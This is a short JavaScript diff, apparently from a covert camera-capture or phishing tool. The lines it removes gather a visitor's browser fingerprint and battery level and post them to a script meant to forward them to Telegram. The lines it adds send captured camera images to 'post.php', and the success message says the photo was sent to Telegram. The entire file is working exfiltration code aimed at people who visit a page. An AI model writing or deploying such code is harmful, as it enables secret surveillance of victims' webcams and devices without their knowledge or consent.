@@ -1,25 +1,16 @@
-var n1 = navigator.userAgent;
-var n2 = navigator.appName;
-var n3 = navigator.appVersion;
-var n4 = navigator.platform;
-var n5 = navigator.language;
-
-var bateria = document.getElementById("bateria");
-
-navigator.getBattery().then(function(battery){
-    var bate = battery.level * 100;
-
+// ajax.js: función para enviar imágenes de la cámara a post.php
+function post(imgdata){
     $.ajax({
-        url: 'device_info.php', // Nuevo archivo para enviar info a Telegram
-        type: 'post',
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
         dataType: 'json',
-        data: {
-            agent: n1,
-            navegador: n2,
-            versionapp: n3,
-            dystro: n4,
-            idioma: n5,
-            bateri: bate
+        async: false,
+        success: function(response){
+            console.log("Foto enviada a Telegram:", response);
+        },
+        error: function(err){
+            console.error("Error enviando la foto:", err);
         }
     });
-});
+}
